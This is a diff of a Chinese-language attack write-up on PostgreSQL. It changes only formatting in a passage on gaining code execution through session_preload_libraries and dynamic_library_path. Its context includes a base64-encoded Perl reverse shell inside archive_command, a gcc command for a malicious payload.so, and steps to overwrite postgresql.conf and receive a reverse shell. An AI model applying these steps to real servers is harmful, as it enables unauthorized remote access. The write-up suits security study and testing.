@@ -324,8 +324,8 @@ archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFM
 
 该攻击向量利用以下配置变量：
 
-> session_preload_libraries  //PostgreSQL 服务器将在客户端连接时加载的库
-> dynamic_library_path  //PostgreSQL 服务器将在其中搜索库的目录列表
+> + session_preload_libraries  //PostgreSQL 服务器将在客户端连接时加载的库
+> + dynamic_library_path  //PostgreSQL 服务器将在其中搜索库的目录列表
 
 我们可以将dynamic_library_path值设置为运行数据库的postgres用户可写的目录，例如/tmp/目录，并在那里上传恶意.so对象。 接下来，我们将通过将新上传的库包含在 session_preload_libraries 变量中来强制 PostgreSQL 服务器加载它。
 
@@ -381,7 +381,7 @@ void _init() {
  gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
 ```
 
-> 6. 上传在步骤 2-3 中创建的恶意 postgresql.conf，并覆盖原始的
+> 6. 上传在步骤 2-3 中创建的恶意 postgresql.conf，并覆盖原始的配置文件
 > 7. 将第5步中的payload.so上传到/tmp目录
 > 8. 通过重新启动服务器或调用 SELECT pg_reload_conf() 查询来重新加载服务器配置
 > 9. 在下一次数据库连接时，将收到反向 shell 连接
